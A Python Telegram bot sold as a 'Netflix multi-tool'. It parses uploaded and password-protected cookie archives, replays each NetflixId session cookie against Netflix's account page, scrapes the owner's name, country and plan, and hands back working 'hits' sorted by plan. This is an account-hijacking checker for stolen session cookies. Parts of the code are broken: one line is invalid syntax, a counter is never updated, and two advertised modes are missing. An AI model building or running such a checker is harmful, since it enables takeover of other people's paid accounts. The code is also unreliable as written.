import os
import re
import json
import logging
import requests
import io
import zipfile
import pyzipper
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
import http.server
import socketserver
from collections import OrderedDict, defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

# ----------------- कॉन्फिगरेशन -----------------
TOKEN = os.environ.get('BOT_TOKEN', "Bot Token Here")
OWNER_ID = 1115202962
ADMIN_IDS = [1115202962]
WATERMARK = "✨ Powered By @ShinchanNoharaTG | @M3UIndiaOriginal ✨"

MAX_WORKERS = 15
COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

ALL_COOKIE_NAMES = {"NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", "flwssn", "memclid"}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

user_locks = defaultdict(asyncio.Lock)
user_state = {}

START_MSG = (
    "<code>\n"
    " 🌟 ────────────────────── 🌟\n"
    "    🔥 NETFLIX MULTI-TOOL BOT 🔥\n"
    " 🌟 ────────────────────── 🌟\n\n"
    " [ 1️⃣ ] Choose your mode below 👇\n"
    " [ 2️⃣ ] Upload .txt / .json / .zip / .rar 📁\n"
    " [ 3️⃣ ] Get instant premium results! 🚀\n"
    "</code>"
)

MAIN_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Account", callback_data="mode_check"),
     InlineKeyboardButton("🔑 Get NF Token", callback_data="mode_nftoken")],
    [InlineKeyboardButton("🧹 Clean Cookies", callback_data="mode_clean"),
     InlineKeyboardButton("📺 Free TV Login", callback_data="mode_tvlogin")]
])

CHECK_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🚀 Start Checking Now", callback_data="start_check")]
])

RESULT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📄 Get as .txt", callback_data="result_txt"),
     InlineKeyboardButton("📦 Get Categorized .zip", callback_data="result_zip")]
])

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# ----------------- 24x7 Pinger & Server -----------------
class PingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self): 
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Server Active 24x7")
    def log_message(self, format, *args):
        return

def run_always_on_pinger():
    time.sleep(20)
    while True:
        try:
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://checker-9kyv.onrender.com")
            requests.get(render_url, timeout=12)
        except: 
            pass
        time.sleep(540)

def run_http_server():
    PORT = int(os.environ.get("PORT", 5000))
    with socketserver.TCPServer(("", PORT), PingHandler) as httpd:
        httpd.serve_forever()

# ----------------- क्लिनिंग आणि पार्सिंग फंक्शन्स -----------------
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except:
        pass
    return html_mod.unescape(val).encode('utf-8', errors='replace').decode('utf-8', errors='replace')

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

cookie_pattern = re.compile(
    r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s+'
    r'(TRUE|FALSE)\s+'
    r'([^\s]+)\s+'
    r'(TRUE|FALSE)\s+'
    r'(\d+)\s+'
    r'([^\s]+)\s+'
    r'([^\s]*)'
)

def parse_cookie_file(text):
    text = text.strip()
    results = []
    
    matches = cookie_pattern.findall(text)
    if matches:
        cookie_dict = {}
        for m in matches:
            domain, flag1, path, flag2, expiry, name, value = m
            if name in ALL_COOKIE_NAMES or "netflix" in domain.lower():
                cookie_dict[name] = value
        if cookie_dict.get('NetflixId'):
            results.append(("netscape_regex", cookie_dict))

    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cookie_dict = {k: str(v) for k, v in obj.items() if k in ALL_COOKIE_NAMES}
                if cookie_dict.get('NetflixId'):
                    results.append(("json_block", cookie_dict))
            elif isinstance(obj, list):
                merged = {c.get("name"): c.get("value") for c in obj if isinstance(c, dict) and c.get("name") in ALL_COOKIE_NAMES}
                if merged.get('NetflixId'):
                    results.append(("json_list", merged))
    except:
        pass

    return results

async def extract_cookies_from_archive(archive_path, password=None):
    cookies = []
    try:
        with pyzipper.AESZipFile(archive_path, 'r') as z:
            if password:
                z.setpassword(password.encode('utf-8'))
            for info in z.infolist():
                if info.is_dir() or info.filename.startswith('__MACOSX'):
                    continue
                if info.filename.lower().endswith(('.txt', '.json')):
                    with z.open(info) as f:
                        try:
                            content = f.read().decode('utf-8', errors='ignore')
                            c = parse_cookie_file(content)
                            for idx, (blockname, cc) in enumerate(c):
                                cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                        except:
                            continue
    except Exception as e:
        log.error(f"Archive extraction error: {e}")
    return cookies

def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId'}
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {'User-Agent': USER_AGENT, 'Accept': 'text/html,application/xhtml+xml'}
    try:
        r = session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=20, allow_redirects=True, verify=False)
        if r.status_code != 200 or 'login' in r.url.lower() or 'signin' in r.url.lower():
            return {'ok': False, 'reason': 'Dead'}
        
        txt = r.text
        def find(pat):
            m = re.search(pat, txt)
            return clean_unicode(m.group(1)) if m else "Unknown"

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"')
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
        plan = find(r'"localizedPlanName".*?"value":"([^"]+)"')
        if plan == "Unknown":
            plan = find(r'"planName"\s*:\s*"([^"]+)"')
            
        on_hold = "isUserOnHold" in txt and "true" in re.search(r'"isUserOnHold"\s*:\s*(true|false)', txt).group(1) if re.search(r'"isUserOnHold"\s*:\s*(true|false)', txt) else False

        return {
            'ok': True, 'premium': True, 'on_hold': on_hold,
            'name': name if name != "Unknown" else "Unknown",
            'country': country if country != "Unknown" else "IN",
            'plan': plan if plan != "Unknown" else "Premium",
            'cookie': cookie_dict
        }
    except:
        return {'ok': False, 'reason': 'Error'}

# ----------------- ॲनिमेशन आणि लोडर -----------------
BRAILLE_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

async def animate_progress(message, current, total):
    percent = int((current / max(total, 1)) * 100)
    filled = int(percent / 10)
    bar = "█" * filled + "▒" * (10 - filled)
    frame = BRAILLE_FRAMES[current % len(BRAILLE_FRAMES)]
    try:
        await message.text = f"{frame} <b>Processing Cookies...</b>\n\n[{bar}] {percent}%\n📊 Checked: {current}/{total}"
    except:
        pass

# ----------------- टेलिग्राम हँडलर्स -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_state[user_id] = {'mode': 'check', 'cookies': [], 'pending_file': None}
    await update.message.reply_html(START_MSG, reply_markup=MAIN_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    modes = {"mode_check": "check", "mode_nftoken": "nftoken", "mode_clean": "clean", "mode_tvlogin": "tvlogin"}
    if query.data in modes:
        mode = modes[query.data]
        user_state[user_id] = {'mode': mode, 'cookies': [], 'pending_file': None}
        await query.answer("Mode selected successfully! ✨")
        if mode == "clean":
            await context.bot.send_message(query.message.chat_id, "🧹 <b>Clean Cookies Mode Active!</b>\n\nSend your messy <b>.txt</b> or password-protected <b>.zip</b> file! 📂", parse_mode='HTML')
        else:
            await context.bot.send_message(query.message.chat_id, f"🔥 Mode Activated: <b>{mode.upper()}</b>\n\nNow send your <b>.txt</b>, <b>.zip</b> or <b>.rar</b> file! 📁", parse_mode='HTML')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        return
    user_id = update.effective_user.id
    if user_id not in user_state:
        user_state[user_id] = {'mode': 'check', 'cookies': [], 'pending_file': None}
        
    doc = update.message.document
    filename = doc.file_name.lower()
    file = await doc.get_file()
    
    td = tempfile.mkdtemp()
    tp = os.path.join(td, doc.file_name)
    await file.download_to_drive(tp)
    
    if filename.endswith('.zip'):
        try:
            with pyzipper.AESZipFile(tp) as z:
                if z.encrypted:
                    user_state[user_id]['pending_file'] = tp
                    await update.message.reply_text("🔒 <b>Protected Archive Detected!</b>\n\n🔑 Please reply with the archive password:", parse_mode='HTML')
                    return
        except:
            pass

    await process_uploaded_file(update, context, tp, filename)

async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_state or not user_state[user_id].get('pending_file'):
        return
        
    password = update.message.text.strip()
    tp = user_state[user_id]['pending_file']
    filename = os.path.basename(tp).lower()
    
    msg = await update.message.reply_text("🔄 <b>Decrypting and extracting archive...</b> ⏳", parse_mode='HTML')
    await process_uploaded_file(update, context, tp, filename, password=password)
    user_state[user_id]['pending_file'] = None
    try:
        await msg.delete()
    except:
        pass

async def process_uploaded_file(update: Update, context: ContextTypes.DEFAULT_TYPE, tp: str, filename: str, password: str = None):
    user_id = update.effective_user.id
    mode = user_state[user_id].get('mode', 'check')
    
    try:
        if filename.endswith('.zip') or filename.endswith('.rar'):
            cookies = await extract_cookies_from_archive(tp, password=password)
            if not cookies and password:
                await update.message.reply_text("❌ <b>Wrong Password or Empty Archive!</b> Please try again.", parse_mode='HTML')
                return
        else:
            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                
            if mode == "clean":
                matches = cookie_pattern.findall(content)
                if matches:
                    formatted_lines = ["\t".join(match) for match in matches]
                    cleaned_content = "\n".join(formatted_lines) + "\n"
                    buf = io.BytesIO(cleaned_content.encode("utf-8"))
                    buf.seek(0)
                    await update.message.reply_document(
                        document=InputFile(buf, filename=f"cleaned_{filename}"),
                        caption=f"✨ <b>Successfully Cleaned!</b>\n📁 File: {filename}\n🍪 Formatted Cookies: {len(matches)}\n\n{WATERMARK}",
                        parse_mode='HTML'
                    )
                else:
                    await update.message.reply_text(f"❌ <b>No matching Netscape cookies found!</b>", parse_mode='HTML')
                return
                
            parsed = parse_cookie_file(content)
            cookies = [(f"cookie_{i}", c) for i, (_, c) in enumerate(parsed)]
            
        if not cookies:
            await update.message.reply_text("❌ <b>No valid Netflix cookies found!</b>", parse_mode='HTML')
            return
            
        user_state[user_id]['cookies'] = cookies
        await update.message.reply_html(f"🎉 <b>File Processed Successfully!</b>\n\n📦 Loaded Cookies: <b>{len(cookies)}</b> 🍪\n🔓 Password Unlocked & Cleaned!\n\n👇 Click below to begin checking:", reply_markup=CHECK_MARKUP)
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Error:</b> {str(e)}", parse_mode='HTML')

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    cookies = user_state.get(user_id, {}).get('cookies', [])
    
    if not cookies:
        await query.answer("No cookies loaded! Please upload a file first. ⚠️")
        return
        
    await query.answer("Checking started! 🚀")
    status_msg = await query.message.reply_text("🔄 <b>Initializing high-speed checker...</b> ⚡", parse_mode='HTML')
    
    start_time = time.time()
    total = len(cookies)
    sub_found = 0
    free = 0
    on_hold = 0
    dead = 0
    errors = 0
    
    premium_4k = 0
    standard = 0
    basic = 0
    mobile = 0
    other = 0
    
    valid_hits = []
    
    for idx, (nm, ck) in enumerate(cookies, 1):
        if idx % 3 == 0 or idx == total:
            try:
                frame = BRAILLE_FRAMES[idx % len(BRAILLE_FRAMES)]
                percent = int((idx / total) * 100)
                bar = "█" * (percent // 10) + "▒" * (10 - (percent // 10))
                await status_msg.edit_text(f"{frame} <b>Checking in progress...</b>\n\n[{bar}] {percent}%\n📊 Progress: {idx}/{total}", parse_mode='HTML')
            except:
                pass
                
        res = check_netflix_cookie(ck)
        if res.get('ok'):
            sub_found += 1
            if res.get('on_hold'):
                on_hold += 1
            
            p_lower = res.get('plan', '').lower()
            if 'ultra' in p_lower or '4k' in p_lower or 'premium' in p_lower:
                premium_4k += 1
            elif 'standard' in p_lower:
                standard += 1
            elif 'basic' in p_lower:
                basic += 1
            elif 'mobile' in p_lower:
                mobile += 1
            else:
                other += 1
                
            valid_hits.append(res)
        else:
            reason = res.get('reason', '')
            if reason == 'Dead':
                dead += 1
            else:
                errors += 1
                
    elapsed = max(int((time.time() - start_time) * 1000), 1)
    avg_speed = elapsed // max(total, 1)
    
    user_state[user_id]['valid_hits'] = valid_hits
    
    result_text = (
        f"🎉 <b>CHECKING COMPLETED!</b> 🎉\n\n"
        f"💯 Total Tested: <b>{total}</b>\n"
        f"🏆 Subscription Found: <b>{sub_found}</b> 🔥\n"
        f"🆓 Free Accounts: <b>{free}</b>\n"
        f"⏸ On Hold: <b>{on_hold}</b>\n"
        f"💀 Dead Cookies: <b>{dead}</b>\n"
        f"⚠️ Errors: <b>{errors}</b>\n"
        f"⏱️ Avg Speed: <b>{avg_speed} ms/cookie</b>\n\n"
        f"📹 <b>Plan Breakdown:</b>\n"
        f"👑 Premium (4K/UHD): <b>{premium_4k}</b>\n"
        f"📺 Standard: <b>{standard}</b>\n"
        f"📱 Basic: <b>{basic}</b>\n"
        f"📲 Mobile: <b>{mobile}</b>\n"
        f"🌐 Other: <b>{other}</b>\n\n"
        f"⭐ <b>Choose output format below :-</b>"
    )
    
    await status_msg.edit_text(result_text, parse_mode='HTML', reply_markup=RESULT_MARKUP)

async def send_result_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('valid_hits', [])
    
    if not hits:
        await query.answer("No hits available! ❌")
        return
        
    lines = []
    for idx, h in enumerate(hits, 1):
        lines.append(f"Name: {h.get('name')} | Country: {h.get('country')} | Plan: {h.get('plan')}")
        lines.append(dict_to_netscape(h.get('cookie', {})))
        lines.append("-" * 40)
        
    buf = io.BytesIO(("\n".join(lines)).encode("utf-8"))
    buf.seek(0)
    await context.bot.send_document(query.message.chat_id, document=InputFile(buf, filename="Netflix_Hits.txt"), caption=f"📄 <b>Here is your clean .txt file!</b> 🚀\n\n{WATERMARK}", parse_mode='HTML')
    await query.answer("TXT file sent successfully! 📤")

async def send_result_zip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    hits = user_state.get(user_id, {}).get('valid_hits', [])
    
    if not hits:
        await query.answer("No hits available! ❌")
        return
        
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, h in enumerate(hits, 1):
            netscape_content = dict_to_netscape(h.get('cookie', {}))
            
            p_lower = h.get('plan', '').lower()
            if 'ultra' in p_lower or '4k' in p_lower or 'premium' in p_lower:
                folder = "👑 Premium"
            elif 'standard' in p_lower:
                folder = "📺 Standard"
            elif 'basic' in p_lower:
                folder = "📱 Basic"
            elif 'mobile' in p_lower:
                folder = "📲 Mobile"
            else:
                folder = "🌐 Other"
                
            file_path = f"{folder}/hit_{idx}_{h.get('country')}.txt"
            zf.writestr(file_path, netscape_content)
            
    zip_buf.seek(0)
    await context.bot.send_document(query.message.chat_id, document=InputFile(zip_buf, filename="Netflix_Categorized_Hits.zip"), caption=f"📦 <b>Here is your categorized .zip file!</b>\n(Folders: Premium, Standard, Basic, Mobile, Other) 📂\n\n{WATERMARK}", parse_mode='HTML')
    await query.answer("Categorized ZIP sent successfully! 🚀")

# ----------------- मुख्य कार्यान्वयन (Main) -----------------
if __name__ == "__main__":
    os.makedirs(COOKIES_DIR, exist_ok=True)
    
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(send_result_txt, pattern="^result_txt$"))
    app.add_handler(CallbackQueryHandler(send_result_zip, pattern="^result_zip$"))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password))
    
    threading.Thread(target=run_always_on_pinger, daemon=True).start()
    threading.Thread(target=run_http_server, daemon=True).start()
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)
